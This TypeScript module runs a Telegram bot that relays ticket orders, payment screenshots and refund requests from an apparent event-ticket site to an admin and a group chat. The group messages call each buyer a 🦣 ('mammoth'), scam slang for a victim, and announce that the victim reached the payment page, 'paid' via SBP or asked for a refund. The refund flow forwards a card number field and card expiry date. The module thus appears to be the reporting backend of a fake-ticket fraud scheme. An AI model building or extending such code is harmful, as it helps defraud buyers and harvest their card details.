import TelegramBot from "node-telegram-bot-api";

// Telegram Bot Configuration - portable environment variables
// TELEGRAM_BOT_TOKEN - токен бота от @BotFather
// ADMIN_TELEGRAM_ID - ID администратора для личных сообщений (узнать через @userinfobot)
// TELEGRAM_GROUP_ID - (опционально) ID группы для групповых уведомлений
// APP_URL - публичный URL приложения для webhook

// Поддержка нескольких вариантов имён переменных для совместимости
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_GROUP_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_TELEGRAM_ID || process.env.TELEGRAM_ADMIN_CHAT_ID;
const GROUP_ID = process.env.TELEGRAM_GROUP_ID;

// Логируем статус конфигурации при старте (не падаем, только предупреждаем)
if (!BOT_TOKEN) {
  console.warn("⚠️ [TelegramAdmin] TELEGRAM_BOT_TOKEN не настроен - Telegram-уведомления отключены");
}
if (!ADMIN_CHAT_ID) {
  console.warn("⚠️ [TelegramAdmin] ADMIN_TELEGRAM_ID не настроен - уведомления администратору отключены");
}

let bot: TelegramBot | null = null;
let webhookInitialized = false;

export function getBot(): TelegramBot | null {
  if (!BOT_TOKEN) {
    // Не падаем - просто возвращаем null, предупреждение уже было при старте
    return null;
  }
  if (!bot) {
    try {
      bot = new TelegramBot(BOT_TOKEN);
    } catch (error) {
      console.error("❌ [TelegramAdmin] Ошибка инициализации бота:", error);
      return null;
    }
  }
  return bot;
}

export async function setupTelegramWebhook(): Promise<boolean> {
  if (webhookInitialized) {
    return true;
  }
  
  const telegramBot = getBot();
  if (!telegramBot) {
    return false;
  }
  
  // Use APP_URL environment variable for the webhook base URL
  // This is the public URL of the deployed application
  const baseUrl = process.env.APP_URL;
  
  if (!baseUrl) {
    console.warn("⚠️ [TelegramAdmin] APP_URL not configured for webhook");
    return false;
  }
  
  const webhookUrl = `${baseUrl}/webhooks/telegram/action`;
  
  try {
    await telegramBot.setWebHook(webhookUrl);
    console.log(`✅ [TelegramAdmin] Webhook set to: ${webhookUrl}`);
    webhookInitialized = true;
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to set webhook:", error);
    return false;
  }
}

// Ticket type interface - defined early for use in all notification functions
export interface OrderNotificationData {
  orderId: number;
  orderCode: string;
  eventName: string;
  eventDate: string;
  eventTime: string;
  cityName: string;
  customerName: string;
  customerPhone: string;
  customerEmail?: string;
  seatsCount: number;
  totalPrice: number;
  ticketType?: string;
  tickets?: { [key: string]: number };
}

// Helper to format ticket breakdown for notifications
function formatTicketBreakdown(tickets?: { [key: string]: number }): string {
  if (!tickets) return '';
  
  const ticketNames: { [key: string]: string } = {
    'standard': 'Входная карта',
    'double': 'Входная карта «для двоих»',
    'discount': 'Льготная',
    'discount_double': 'Льготная «для двоих»'
  };
  
  const parts: string[] = [];
  for (const [type, count] of Object.entries(tickets)) {
    if (count > 0) {
      const name = ticketNames[type] || type;
      parts.push(`${count}x ${name}`);
    }
  }
  
  return parts.length > 0 ? parts.join(', ') : '';
}

export async function sendChannelNotification(
  order: OrderNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized for channel");
    return false;
  }

  // If no GROUP_ID, send to admin instead
  const targetChatId = GROUP_ID || ADMIN_CHAT_ID;
  if (!targetChatId) {
    console.warn("⚠️ [TelegramAdmin] No TELEGRAM_GROUP_ID or TELEGRAM_ADMIN_CHAT_ID configured");
    return false;
  }

  console.log("📤 [TelegramAdmin] Sending channel notification for:", order.orderCode);

  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const message = `🔔🦣 перешел на страницу оплаты🔔
ФИО: ${order.customerName}
Сумма: ${order.totalPrice} руб.
Билеты: ${ticketInfo}
${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;

  try {
    await telegramBot.sendMessage(targetChatId, message);
    console.log("✅ [TelegramAdmin] Channel notification sent to:", targetChatId);
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send channel notification:", error);
    return false;
  }
}

export async function sendChannelPaymentPending(
  order: OrderNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized for channel");
    return false;
  }

  if (!GROUP_ID) {
    console.warn("⚠️ [TelegramAdmin] TELEGRAM_GROUP_ID not configured");
    return false;
  }

  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const message = `🔔🦣 подтвердил оплату через SBP🔔
ФИО: ${order.customerName}
Сумма: ${order.totalPrice}
Билеты: ${ticketInfo}
${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;

  try {
    await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Channel payment pending notification sent");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send channel notification:", error);
    return false;
  }
}

export async function sendChannelPaymentConfirmed(
  order: OrderNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized for channel");
    return false;
  }

  if (!GROUP_ID) {
    console.warn("⚠️ [TelegramAdmin] TELEGRAM_GROUP_ID not configured");
    return false;
  }

  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const message = `✅Успешная оплата

💵Сумма покупки: ${order.totalPrice} руб.
Билеты: ${ticketInfo}
${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;

  try {
    await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Channel payment confirmed notification sent");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send channel notification:", error);
    return false;
  }
}

export async function sendChannelPaymentRejected(
  order: OrderNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized for channel");
    return false;
  }

  if (!GROUP_ID) {
    console.warn("⚠️ [TelegramAdmin] TELEGRAM_GROUP_ID not configured");
    return false;
  }

  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const message = `⛔Ошибка платежа

ФИО: ${order.customerName}
Сумма покупки: ${order.totalPrice} руб.
Билеты: ${ticketInfo}
${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;

  try {
    await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Channel payment rejected notification sent");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send channel notification:", error);
    return false;
  }
}

export async function sendOrderNotificationToAdmin(
  order: OrderNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized");
    return false;
  }

  if (!ADMIN_CHAT_ID) {
    console.error("❌ [TelegramAdmin] TELEGRAM_ADMIN_CHAT_ID not configured");
    return false;
  }

  console.log("📤 [TelegramAdmin] Sending order notification to admin:", order.orderCode);

  const message = `🎫 *Клиент на странице оплаты!*

📋 *Код заказа:* \`${order.orderCode}\`

🎭 *Мероприятие:* ${escapeMarkdown(order.eventName)}
📍 *Город:* ${escapeMarkdown(order.cityName)}
📅 *Дата:* ${order.eventDate}
⏰ *Время:* ${order.eventTime ? order.eventTime.substring(0, 5) : ''}

👤 *Покупатель:* ${escapeMarkdown(order.customerName)}
📞 *Телефон:* ${escapeMarkdown(order.customerPhone)}
${order.customerEmail ? `📧 *Email:* ${escapeMarkdown(order.customerEmail)}` : ""}

🎟 *Мест:* ${order.seatsCount}
💰 *Сумма:* ${order.totalPrice} ₽

⏳ *Статус:* Клиент выбирает способ оплаты`;

  try {
    await telegramBot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: "Markdown",
    });
    console.log("✅ [TelegramAdmin] Notification sent successfully");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send notification:", error);
    return false;
  }
}

export async function updateOrderMessageStatus(
  chatId: string | number,
  messageId: number,
  orderCode: string,
  status: "confirmed" | "rejected",
  adminUsername?: string
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    return false;
  }

  const statusText = status === "confirmed" 
    ? "✅ *ОПЛАТА ПОДТВЕРЖДЕНА*" 
    : "❌ *ЗАКАЗ ОТКЛОНЁН*";
  
  const adminInfo = adminUsername ? `\n👤 Обработал: @${adminUsername}` : "";
  const timestamp = new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

  const newText = `${statusText}

📋 *Код заказа:* \`${orderCode}\`
📅 *Обработано:* ${timestamp}${adminInfo}`;

  try {
    await telegramBot.editMessageText(newText, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    });
    console.log(`✅ [TelegramAdmin] Message updated for order ${orderCode}`);
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to update message:", error);
    return false;
  }
}

export async function answerCallbackQuery(
  callbackQueryId: string,
  text: string
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    return false;
  }

  try {
    await telegramBot.answerCallbackQuery(callbackQueryId, { text });
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to answer callback:", error);
    return false;
  }
}

export async function sendPaymentConfirmationWithPhoto(
  order: OrderNotificationData,
  photoBase64: string
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized for photo");
    return false;
  }

  if (!ADMIN_CHAT_ID) {
    console.error("❌ [TelegramAdmin] TELEGRAM_ADMIN_CHAT_ID not configured");
    return false;
  }

  console.log("📤 [TelegramAdmin] Sending payment confirmation with photo for:", order.orderCode);

  const caption = `💳 *Клиент нажал "Я оплатил"!*

📋 *Код заказа:* \`${order.orderCode}\`

🎭 *Мероприятие:* ${escapeMarkdown(order.eventName)}
📍 *Город:* ${escapeMarkdown(order.cityName)}
📅 *Дата:* ${order.eventDate}
⏰ *Время:* ${order.eventTime ? order.eventTime.substring(0, 5) : ''}

👤 *Покупатель:* ${escapeMarkdown(order.customerName)}
📞 *Телефон:* ${escapeMarkdown(order.customerPhone)}
${order.customerEmail ? `📧 *Email:* ${escapeMarkdown(order.customerEmail)}` : ""}

🎟 *Мест:* ${order.seatsCount}
💰 *Сумма:* ${order.totalPrice} ₽

📎 *Скриншот чека прикреплён*`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Подтвердить оплату", callback_data: `confirm_${order.orderId}` },
        { text: "❌ Отклонить", callback_data: `reject_${order.orderId}` },
      ],
    ],
  };

  try {
    // Convert base64 to buffer
    const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
    const photoBuffer = Buffer.from(base64Data, 'base64');
    
    await telegramBot.sendPhoto(ADMIN_CHAT_ID, photoBuffer, {
      caption: caption,
      parse_mode: "Markdown",
      reply_markup: keyboard,
    });
    console.log("✅ [TelegramAdmin] Photo notification sent successfully");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send photo notification:", error);
    return false;
  }
}

export async function sendPaymentConfirmationNoPhoto(
  order: OrderNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot) {
    console.error("❌ [TelegramAdmin] Bot not initialized");
    return false;
  }

  if (!ADMIN_CHAT_ID) {
    console.error("❌ [TelegramAdmin] TELEGRAM_ADMIN_CHAT_ID not configured");
    return false;
  }

  console.log("📤 [TelegramAdmin] Sending payment confirmation without photo for:", order.orderCode);

  const message = `💳 *Клиент нажал "Я оплатил"!*

📋 *Код заказа:* \`${order.orderCode}\`

🎭 *Мероприятие:* ${escapeMarkdown(order.eventName)}
📍 *Город:* ${escapeMarkdown(order.cityName)}
📅 *Дата:* ${order.eventDate}
⏰ *Время:* ${order.eventTime ? order.eventTime.substring(0, 5) : ''}

👤 *Покупатель:* ${escapeMarkdown(order.customerName)}
📞 *Телефон:* ${escapeMarkdown(order.customerPhone)}
${order.customerEmail ? `📧 *Email:* ${escapeMarkdown(order.customerEmail)}` : ""}

🎟 *Мест:* ${order.seatsCount}
💰 *Сумма:* ${order.totalPrice} ₽

⚠️ *Скриншот не прикреплён*`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Подтвердить оплату", callback_data: `confirm_${order.orderId}` },
        { text: "❌ Отклонить", callback_data: `reject_${order.orderId}` },
      ],
    ],
  };

  try {
    await telegramBot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: "Markdown",
      reply_markup: keyboard,
    });
    console.log("✅ [TelegramAdmin] Payment notification sent successfully");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send payment notification:", error);
    return false;
  }
}

function escapeMarkdown(text: string): string {
  return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, "\\$&");
}

// Refund notification types
interface RefundNotificationData {
  refundCode: string;
  amount: number;
  customerName?: string;
  refundNumber?: string;
  refundNote?: string;
  cardNumber?: string;
  cardExpiry?: string;
}

export async function sendRefundPageVisitNotification(
  refund: RefundNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot || !GROUP_ID) {
    return false;
  }

  const message = `🔔🦣 перешел на страницу возврата🔔
Сумма: ${refund.amount} руб.`;

  try {
    await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Refund page visit notification sent");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send refund visit notification:", error);
    return false;
  }
}

export async function sendRefundRequestNotification(
  refund: RefundNotificationData
): Promise<{ success: boolean; messageId?: number }> {
  const telegramBot = getBot();
  if (!telegramBot || !GROUP_ID) {
    return { success: false };
  }

  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' 
    ? refund.refundNote 
    : 'Без примечания';
  
  const message = `🔔🦣 запросил возврат средств🔔
ФИО: ${refund.customerName || 'Не указано'}  
Сумма: ${refund.amount} руб.
${note}`;

  try {
    const sentMessage = await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Refund request notification sent");
    return { success: true, messageId: sentMessage.message_id };
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send refund request notification:", error);
    return { success: false };
  }
}

export async function sendRefundToAdmin(
  refund: RefundNotificationData
): Promise<{ success: boolean; messageId?: number }> {
  const telegramBot = getBot();
  if (!telegramBot || !ADMIN_CHAT_ID) {
    return { success: false };
  }

  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' 
    ? refund.refundNote 
    : 'Без примечания';

  const message = `💰 *Заявка на возврат средств*

👤 *ФИО:* ${escapeMarkdown(refund.customerName || 'Не указано')}
💵 *Сумма:* ${refund.amount} руб.
💳 *Карта:* \\*\\*\\*\\*${refund.cardNumber || '----'}
📅 *Срок:* ${refund.cardExpiry || '--/--'}
📝 *Примечание:* ${escapeMarkdown(note)}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Одобрить возврат", callback_data: `refund_approve_${refund.refundCode}` },
        { text: "❌ Отклонить", callback_data: `refund_reject_${refund.refundCode}` },
      ],
    ],
  };

  try {
    const sentMessage = await telegramBot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: "Markdown",
      reply_markup: keyboard,
    });
    console.log("✅ [TelegramAdmin] Refund admin notification sent");
    return { success: true, messageId: sentMessage.message_id };
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send refund admin notification:", error);
    return { success: false };
  }
}

export async function sendRefundApprovedNotification(
  refund: RefundNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot || !GROUP_ID) {
    return false;
  }

  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' 
    ? refund.refundNote 
    : '';
    
  const message = `✅Успешный возврат

ФИО: ${refund.customerName || 'Не указано'}  
💵Сумма возврата: ${refund.amount} руб.${note ? '\n' + note : ''}`;

  try {
    await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Refund approved notification sent");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send refund approved notification:", error);
    return false;
  }
}

export async function sendRefundRejectedNotification(
  refund: RefundNotificationData
): Promise<boolean> {
  const telegramBot = getBot();
  if (!telegramBot || !GROUP_ID) {
    return false;
  }

  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' 
    ? refund.refundNote 
    : '';
    
  const message = `⛔Ошибка платежа

ФИО: ${refund.customerName || 'Не указано'}  
Сумма покупки: ${refund.amount} руб.${note ? '\n' + note : ''}`;

  try {
    await telegramBot.sendMessage(GROUP_ID, message);
    console.log("✅ [TelegramAdmin] Refund rejected notification sent");
    return true;
  } catch (error) {
    console.error("❌ [TelegramAdmin] Failed to send refund rejected notification:", error);
    return false;
  }
}
